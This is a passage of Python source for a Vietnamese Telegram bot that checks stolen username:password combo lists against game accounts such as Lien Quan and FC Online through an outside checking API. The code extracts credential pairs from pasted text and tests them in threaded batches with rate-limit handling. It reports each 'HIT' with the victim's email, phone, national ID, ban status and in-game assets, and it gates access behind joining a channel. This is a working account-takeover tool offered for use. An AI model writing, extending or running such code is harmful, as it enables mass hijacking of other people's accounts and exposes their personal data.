        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack (Tat ca)",
        "icon": "📦",
        "params": ["tk", "mk"],
        "extra_params": {}
    }
}

checking = False
stop_event = threading.Event()
pending_accounts = {}
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
cache_results = {}
cache_lock = threading.Lock()

rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def rate_limit(delay=DEFAULT_DELAY):
    global last_request_time
    with rate_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < delay:
            sleep_time = delay - time_since_last
            time.sleep(sleep_time)
        last_request_time = time.time()

def fix_encoding(text):
    if not isinstance(text, str):
        return text
    
    replacements = {
        'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
        'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
        'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
        'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
        'á»·': 'ỷ', 'á»µ': 'ỵ',
        'Nghiá»‡p': 'Nghiệp', 'Hoáº£': 'Hoả', 'YÃªu': 'Yêu', 'Háº­u': 'Hậu',
        'Tháº¿': 'Thế', 'Tá»­': 'Tử', 'Nguyá»‡t': 'Nguyệt', 'Tá»™c': 'Tộc',
        'SiÃªu': 'Siêu', 'viá»‡t': 'việt', 'Ngá»™': 'Ngộ', 'KhÃ´ng': 'Không',
        'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
        'Giai': 'Giai', 'Ä‘iá»‡u': 'điệu', 'GiÃ¡ng': 'Giáng', 'Sinh': 'Sinh',
        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 
        'ThÆ°á»£ng': 'Thượng', 'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
        'Tel\'Annas': "Tel'Annas", 'VÅ©': 'Vũ', 'khÃºc': 'khúc', 'yÃªu': 'yêu',
        'Ã¡': 'á', 'Ã¢': 'â', 'Äƒ': 'ă', 'áº¯': 'ắ', 'áº±': 'ằ',
        'áº³': 'ẳ', 'áºµ': 'ẵ', 'áº·': 'ặ', 'áº¥': 'ấ', 'áº§': 'ầ',
        'áº©': 'ẩ', 'áº«': 'ẫ', 'áº­': 'ậ', 'á»“': 'ồ', 'á»•': 'ổ',
        'á»—': 'ỗ', 'á»™': 'ộ', 'á»': 'ở', 'á»¡': 'ỡ', 'á»£': 'ợ',
        'á»§': 'ủ', 'Å©': 'ũ', 'á»¥': 'ụ', 'Ã¹': 'ù', 'Ãº': 'ú',
        'á»©': 'ứ', 'á»«': 'ừ', 'á»­': 'ử', 'á»¯': 'ữ', 'á»±': 'ự',
        'á»‰': 'ỉ', 'á»‹': 'ị', 'áº¹': 'ẻ', 'áº»': 'ẻ', 'áº½': 'ẽ',
        'áº¹': 'ẹ', 'á»‰': 'ỉ', 'á»‹': 'ị'
    }
    
    for old, new in replacements.items():
        text = text.replace(old, new)
    
    if any(char in text for char in ['Ã', 'Ä', 'Æ', 'á»', 'áº', 'Å©', 'Ä©']):
        try:
            fixed = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
            if fixed != text and len(fixed) > 0:
                text = fixed
        except:
            pass
    
    return text

def is_user_member(user_id):
    try:
        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        status = chat_member.status
        if status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"[!] Loi kiem tra thanh vien: {e}")
        return False

def check_membership(message):
    user_id = message.from_user.id
    if is_user_member(user_id):
        return True
    
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton(
        text="📢 THAM GIA KENH BAT BUOC",
        url=REQUIRED_CHANNEL_URL
    )
    check_button = telebot.types.InlineKeyboardButton(
        text="✅ TOI DA THAM GIA",
        callback_data="check_join"
    )
    markup.add(join_button)
    markup.add(check_button)
    
    safe_send_message(
        message.chat.id,
        f"""
🔒 <b>BAN CHUA THAM GIA KENH BAT BUOC!</b>

📢 Vui long tham gia kenh sau de su dung bot:
👉 <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>

Sau khi tham gia, bam nut ben duoi de xac nhan!
""",
        parse_mode="HTML"
    )
    
    try:
        bot.send_message(message.chat.id, "👇 Xac nhan sau khi tham gia:", reply_markup=markup)
    except:
        pass
    
    return False

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    user_id = call.from_user.id
    
    if is_user_member(user_id):
        bot.answer_callback_query(call.id, "✅ Xac nhan thanh cong!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        safe_send_message(
            call.message.chat.id,
            "✅ <b>XAC NHAN THANH CONG!</b>\n\nChao mung ban den voi bot!\nDung /start de xem huong dan."
        )
    else:
        bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)
        safe_send_message(
            call.message.chat.id,
            f"""
❌ <b>BAN CHUA THAM GIA KENH!</b>

Vui long tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
Sau do bam nut xac nhan lai.
"""
        )

def safe_send_message(chat_id, text, parse_mode="HTML"):
    if not text:
        return
    
    text = fix_encoding(text)
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for part in parts:
            try:
                bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
                try:
                    bot.send_message(chat_id, part.strip())
                except:
                    pass
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")
            try:
                bot.send_message(chat_id, text)
            except:
                pass

def loc_tk_mk_only(content):
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    
    if not content:
        return accounts, stats_loc
    
    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
            continue
        if re.match(r'^\d+$', line):
            continue
        
        matches = re.findall(pattern_colon, line)
        if matches:
            for user, pwd in matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
            continue
        
        matches = re.findall(pattern_pipe, line)
        if matches:
            for user, pwd in matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    if not accounts:
        all_matches = re.findall(pattern_colon, content)
        for user, pwd in all_matches:
            if is_time_value(user) or is_time_value(pwd):
                continue
            if is_valid_account(user, pwd):
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
                    stats_loc["valid"] += 1
                else:
                    stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
        
        if not accounts:
            all_matches = re.findall(pattern_pipe, content)
            for user, pwd in all_matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    return accounts, stats_loc

def is_time_value(value):
    if not value:
        return False
    
    value = str(value).strip()
    
    time_patterns = [
        r'^\d{1,2}:\d{2}(:\d{2})?$',
        r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',
        r'^\d{1,2}\.\d{2}(\.\d{2})?$',
        r'^\d{1,2}-\d{2}(-\d{2})?$',
        r'^\d{1,2}/\d{2}(/\d{2,4})?$',
        r'^\d{4}-\d{2}-\d{2}$',
        r'^\d{4}/\d{2}/\d{2}$',
        r'^\d{2}-\d{2}-\d{4}$',
        r'^\d{2}/\d{2}/\d{4}$',
        r'^\d{1,2}h\d{2}(p\d{2})?$',
        r'^\d{1,2}giờ\d{2}$',
        r'^\d{1,2}:\d{2}:\d{2}\.\d+$',
        r'^\d+:\d+$',
        r'^\d+\.\d+$',
        r'^\d+-\d+$',
        r'^\d{10,13}$',
        r'^\d{1,2}\s*(AM|PM|am|pm)$',
    ]
    
    for pattern in time_patterns:
        if re.match(pattern, value, re.IGNORECASE):
            return True
    
    return False

def is_valid_account(user, pwd):
    if len(user) < 2 or len(pwd) < 1:
        return False
    if len(user) > 80 or len(pwd) > 100:
        return False
    if is_time_value(user) or is_time_value(pwd):
        return False
    if re.match(r'^\d+$', user) or re.match(r'^\d+$', pwd):
        return False
    
    user_lower = user.lower()
    skip_keywords = ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio', 'giờ', 
                     'phut', 'phút', 'giay', 'giây', 'timestamp', 'datetime',
                     'created', 'login', 'session', 'expires', 'expire', 'valid',
                     'http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 
                     'final', 'name', 'level', 'rank', 'status', 'email', 'phone', 
                     'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other', 
                     'am', 'pm', 'utc', 'gmt']
    
    for keyword in skip_keywords:
        if keyword in user_lower:
            return False
    
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
        return False
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
        return False
    
    return True

def save_loc_file(accounts):
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

# KHONG LUU KET QUA
def save_result(username, password, status, service=""):
    pass

def format_value(value):
    if isinstance(value, bool):
        return "YES" if value else "NO"
    elif isinstance(value, str) and value.lower() in ["true", "false"]:
        return "YES" if value.lower() == "true" else "NO"
    return value

def check_account_api(username, password, service, use_delay=True):
    if use_delay:
        rate_limit(DEFAULT_DELAY)
    
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    service_info = SERVICE_ROUTES.get(service, {})
    route = service_info.get("route", "/api/lienquan")
    param_names = service_info.get("params", ["tk", "mk"])
    extra_params = service_info.get("extra_params", {})
    
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD
    }
    
    if len(param_names) >= 2:
        params[param_names[0]] = username
        params[param_names[1]] = password
    else:
        params["tk"] = username
        params["mk"] = password
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    result_data = resp.json()
                    
                    if isinstance(result_data, dict):
                        for key, value in result_data.items():
                            if isinstance(value, str):
                                result_data[key] = fix_encoding(value)
                            elif isinstance(value, list):
                                result_data[key] = [fix_encoding(item) if isinstance(item, str) else item for item in value]
                            elif isinstance(value, dict):
                                for sub_key, sub_value in value.items():
                                    if isinstance(sub_value, str):
                                        value[sub_key] = fix_encoding(sub_value)
                    
                    if isinstance(result_data, dict):
                        is_hit = False
                        
                        status_val = result_data.get("status")
                        if status_val is not None:
                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
                                is_hit = True
                            elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                                is_hit = False
                        
                        success_val = result_data.get("success")
                        if not is_hit and success_val is not None:
                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                is_hit = True
                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                is_hit = False
                        
                        result_val = result_data.get("result")
                        if result_val is not None:
                            result_str = str(result_val).lower()
                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                is_hit = True
                            elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                                is_hit = False
                        
                        message_val = result_data.get("message", "")
                        if message_val:
                            msg_lower = str(message_val).lower()
                            if any(word in msg_lower for word in ["thanh cong", "thanh cong", "success", "valid", "hit", "dung", "live", "ok"]):
                                is_hit = True
                            elif any(word in msg_lower for word in ["that bai", "that bai", "fail", "invalid", "dead", "sai", "khong dung", "die", "error"]):
                                is_hit = False
                        
                        data_val = result_data.get("data")
                        if data_val is not None:
                            if isinstance(data_val, (dict, list, str)) and data_val:
                                is_hit = True
                        
                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt"]
                        for field in info_fields:
                            if field in result_data and result_data[field] is not None and result_data[field] != "":
                                is_hit = True
                                break
                        
                        result_data["result"] = "hit" if is_hit else "dead"
                        
                        with cache_lock:
                            cache_results[cache_key] = result_data
                        return result_data
                    else:
                        result = {"result": "unknown"}
                        with cache_lock:
                            cache_results[cache_key] = result
                        return result
                        
                except json.JSONDecodeError:
                    text_lower = resp.text.lower()
                    if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid", "live"]):
                        result = {"result": "hit"}
                    elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
                        result = {"result": "dead"}
                    else:
                        result = {"result": "unknown"}
                    
                    with cache_lock:
                        cache_results[cache_key] = result
                    return result
                    
            elif resp.status_code == 429:
                retry_after = resp.headers.get("Retry-After", "5")
                try:
                    wait_time = int(retry_after)
                except:
                    wait_time = 5 * (attempt + 1)
                time.sleep(wait_time)
                continue
            elif resp.status_code == 401:
                result = {"result": "error", "_error": "Invalid API credentials"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            elif resp.status_code == 403:
                result = {"result": "error", "_error": "Forbidden access"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            else:
                time.sleep(2)
                continue
                
        except requests.exceptions.Timeout:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
        except requests.exceptions.ConnectionError:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(5)
                continue
        except Exception:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
    
    result = {"result": "error", "_error": "All retries failed"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

def format_hit_info(username, password, service, result_data):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    line = "━━━━━━━━━━━━━━━━━━━━━━"
    
    msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
    
    if isinstance(result_data, dict):
        field_map = {
            "uid": ("👤 UID", "uid"),
            "name": ("👤 Name", "name"),
            "nickname": ("👤 Nickname", "nickname"),
            "region": ("🌐 Region", "region"),
            "shells": ("💰 Shells", "shells"),
            "so": ("💲 So", "so"),
            "nap_so": ("💰 Nap so", "nap_so"),
            "email_verified": ("📩 EMAIL", "email_verified"),
            "email": ("📩 EMAIL", "email"),
            "mobile_bound": ("📱 SDT", "mobile_bound"),
            "phone": ("📱 SDT", "phone"),
            "sdt": ("📱 SDT", "sdt"),
            "fb": ("🔗 FB", "fb"),
            "fb_linked": ("🔗 FB", "fb_linked"),
            "password_set": ("🛡 PASS", "password_set"),
            "account_secured": ("🛡 Account Secured", "account_secured"),
            "banned": ("🚫 BAND", "banned"),
            "ban": ("🚫 BAND", "ban"),
            "aov_banned": ("🚫 BAND", "aov_banned"),
            "ban_until": ("🚫 BAND Den", "ban_until"),
            "ban_expires": ("🚫 BAND Den", "ban_expires"),
            "last_login": ("⏰ Login cuoi", "last_login"),
            "garena_created": ("📅 Tao GR", "garena_created"),
            "created_at": ("📅 Tao GR", "created_at"),
            "server": ("🖥 Server", "server"),
            "aov_name": ("🔥 NAME", "aov_name"),
            "aov_rank": ("👑 RANK", "aov_rank"),
            "aov_level": ("✨ LEVEL", "aov_level"),
            "aov_total_skins": ("💎 SKIN", "aov_total_skins"),
            "aov_total_champs": ("💪 HERO", "aov_total_champs"),
            "aov_total_heroes": ("💪 HERO", "aov_total_heroes"),
            "aov_total_relationships": ("⚡️ QH", "aov_total_relationships"),
            "aov_ss": ("✨ SS", "aov_ss"),
            "aov_sss": ("🔥 SSS", "aov_sss"),
            "aov_anime": ("🔥 Anime", "aov_anime"),
            "aov_ss_list": ("✨ SS List", "aov_ss_list"),
            "aov_sss_list": ("🔥 SSS List", "aov_sss_list"),
            "aov_anime_list": ("🔥 Anime List", "aov_anime_list"),
            "aov_other": ("🎲 Other", "aov_other"),
            "aov_other_list": ("🎲 Other List", "aov_other_list"),
            "cccd": ("📄 CCCD", "cccd"),
            "authen": ("🛡 Authen", "authen"),
            "tinh_trang": ("📋 Tinh Trang", "tinh_trang"),
            "status_account": ("📋 Tinh Trang", "status_account"),
            "fc_name": ("🔥 FC Name", "fc_name"),
            "fc_uid": ("🆔 FC UID", "fc_uid"),
            "fc_ovr": ("📊 OVR", "fc_ovr"),
            "fc_level": ("✨ FC Level", "fc_level"),
            "fc_rank": ("👑 FC Rank", "fc_rank"),
            "last_session_ip": ("🌐 IP", "last_session_ip"),
            "last_session_country": ("🌍 Country", "last_session_country"),
            "ngay_tao_tk": ("📅 Ngay tao TK", "ngay_tao_tk"),
            "ban_reason": ("🚫 Ly do Band", "ban_reason")
        }
        
        info_lines = []
        
        for key, (label, field) in field_map.items():
            if field in result_data and result_data[field] is not None and result_data[field] != "" and result_data[field] != "N/A":
                value = result_data[field]
                
                if isinstance(value, (int, float)) and value == 0:
                    continue
                if isinstance(value, str) and value in ["0", "00", "000"]:
                    continue
                
                if isinstance(value, str):
                    value = fix_encoding(value)
                
                if field in ["email_verified", "mobile_bound", "fb_linked", "password_set", "account_secured"]:
                    value = format_value(value)
                
                if field == "aov_banned":
                    if isinstance(value, str) and value.upper() == "NO":
                        value = "NO"
                    elif isinstance(value, bool):
                        value = "YES" if value else "NO"
                
                if isinstance(value, list):
                    if value:
                        value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
                    else:
                        continue
                
                if isinstance(value, tuple):
                    if value:
                        value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
                    else:
                        continue
                
                if field in ["banned", "ban", "aov_banned"]:
                    if isinstance(value, str) and value.upper() == "NO":
                        value = "NO"
                    elif isinstance(value, bool):
                        value = "YES" if value else "NO"
                    elif isinstance(value, str) and value.upper() == "YES":
                        value = "YES"
                
                if field in ["ban_until", "ban_expires"]:
                    if isinstance(value, str):
                        value = fix_encoding(value)
                        value = f"[{value}]"
                
                info_lines.append(f"{label}: {value}")
        
        skip_fields = set(field_map.keys())
        skip_fields.update(["result", "_is_hit", "_raw_response", "_error", "status", "success", "tk", "mk", "data", "message", "username"])
        
        for key, value in result_data.items():
            if key not in skip_fields and value is not None and value != "" and value != {} and value != []:
                if isinstance(value, (int, float)) and value == 0:
                    continue
                if isinstance(value, str) and value in ["0", "00", "000"]:
                    continue
                
                if isinstance(value, (str, int, float)):
                    label = key.replace("_", " ").title()
                    value = format_value(value)
                    if isinstance(value, str):
                        value = fix_encoding(value)
                    info_lines.append(f"▫️ {label}: {value}")
                elif isinstance(value, list) and value:
                    label = key.replace("_", " ").title()
                    list_value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
                    info_lines.append(f"▫️ {label}: {list_value}")
                elif isinstance(value, dict):
                    for sub_key, sub_value in value.items():
                        if sub_value is not None and sub_value != "" and sub_value != {} and sub_value != []:
                            if isinstance(sub_value, (str, int, float)):
                                if isinstance(sub_value, (int, float)) and sub_value == 0:
                                    continue
                                sub_label = sub_key.replace("_", " ").title()
                                sub_value = format_value(sub_value)
                                if isinstance(sub_value, str):
                                    sub_value = fix_encoding(sub_value)
                                info_lines.append(f"▫️ {sub_label}: {sub_value}")
        
        if info_lines:
            msg += "\n".join(info_lines)
            msg += f"\n{line}"
    
    return msg

def check_single(chat_id, username, password, service="lienquan"):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    result = check_account_api(username, password, service, use_delay=False)
    result_type = result.get("result", "unknown")
    
    if result_type == "hit":
        hit_msg = format_hit_info(username, password, service, result)
        safe_send_message(chat_id, hit_msg)
    elif result_type == "dead":
        safe_send_message(chat_id, f"❌ DEAD - {service_desc}\n🔑 {username}:{password}")
    else:
        safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")

def check_batch(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK - V6.1</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
📦 Batch: <code>{CHECKMULTI_BATCH_SIZE} acc/batch</code>
""")
    
    batches = []
    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
        batch = accounts[i:i + CHECKMULTI_BATCH_SIZE]
        batches.append(batch)
    
    total_batches = len(batches)
    batch_num = 0
    
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        
        rate_limit(CHECKMULTI_DELAY)
        
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1
    
    for batch in batches:
        if stop_event.is_set():
            break
        
        batch_num += 1
        
        safe_send_message(chat_id, f"""
📦 <b>BATCH {batch_num}/{total_batches}</b>
🔍 Dang check {len(batch)} accounts...
""")
        
        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
            futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                       for user, pwd in batch}
            
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        
        elapsed = time.time() - stats["start_time"]
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats["checked"] / total) * 100
        
        safe_send_message(chat_id, f"""
📊 <b>TIEN DO - {stats['checked']}/{total}</b> ({percent:.1f}%)
✅ Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
        
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    safe_send_message(chat_id, f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🎯 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ ERROR: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
""")

def check_all_services(chat_id, accounts):
    global checking
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    
    safe_send_message(chat_id, f"""
⚡ <b>CHECK TAT CA SERVICE</b>
📊 Accounts: <code>{total_accounts}</code>
📋 Services: <code>{total_services}</code>
""")
    
    stats_all = {
        "total": total_accounts * total_services,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    def process_all(user, pwd, service):
        if stop_event.is_set():
            return
        
        rate_limit(DEFAULT_DELAY)
        
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        
        with stats_lock:
            stats_all["checked"] += 1
            if result_type == "hit":
                stats_all["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    
    batches = []
    for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
        batch_accounts = accounts[i:i + CHECKMULTI_BATCH_SIZE]
        batches.append(batch_accounts)
    
    batch_num = 0
    total_batches = len(batches)
    
    for batch_accounts in batches:
        if stop_event.is_set():
            break
        
        batch_num += 1
        
        safe_send_message(chat_id, f"""
📦 <b>BATCH {batch_num}/{total_batches}</b>
🔍 Dang check {len(batch_accounts)} accounts x {total_services} services...
""")
        
        all_tasks = [(user, pwd, service) for user, pwd in batch_accounts for service in SERVICE_ROUTES.keys()]
        
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
            futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) 
                       for user, pwd, service in all_tasks}
            
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        
        elapsed = time.time() - stats_all["start_time"]
        speed = stats_all["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats_all["checked"] / stats_all["total"]) * 100
        
        safe_send_message(chat_id, f"""
📊 <b>TIEN DO - {stats_all['checked']}/{stats_all['total']}</b> ({percent:.1f}%)
🎯 Hits: <code>{stats_all['hits']}</code>
❌ Dead: <code>{stats_all['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
        
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    
    safe_send_message(chat_id, f"""
✅ CHECK ALL HOAN TAT!
🎯 Hits: {stats_all['hits']}
❌ Dead: {stats_all['dead']}
⚠️ Errors: {stats_all['errors']}
⏱ Time: {elapsed:.1f}s
""")

# ========== LENH ==========
@bot.message_handler(commands=['upaudio'])
def cmd_upaudio(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "❌ Ban khong co quyen!")
        return
    
    safe_send_message(message.chat.id, """
🎵 <b>UPLOAD AUDIO - ADMIN</b>
Gui file .wav hoac .mp3 vao bot
""")

@bot.message_handler(content_types=['audio'])
def handle_audio_upload(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "❌ Khong co quyen!")
        return
    
    global CUSTOM_AUDIO_DATA
    
    try:
        file_info = bot.get_file(message.audio.file_id)
        audio_data = bot.download_file(file_info.file_path)
        
        if not audio_data:
            safe_send_message(message.chat.id, "❌ Khong the tai audio!")
            return
        
        if len(audio_data) > 20 * 1024 * 1024:
            safe_send_message(message.chat.id, "❌ File qua lon! Gioi han 20MB.")
            return
        
        with AUDIO_LOCK:
            CUSTOM_AUDIO_DATA = audio_data
        
        with open(CUSTOM_AUDIO_PATH, 'wb') as f:
            f.write(audio_data)
        
        duration = message.audio.duration if message.audio.duration else 0
        file_size_mb = len(audio_data) / (1024 * 1024)
        
        safe_send_message(message.chat.id, f"""
✅ UPLOAD AUDIO THANH CONG!
📁 Ten: {message.audio.file_name or 'audio'}
⏱ {duration}s | 📦 {file_size_mb:.2f} MB
""")
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Loi: {e}")

@bot.message_handler(commands=['delaudio'])
def cmd_delaudio(message):
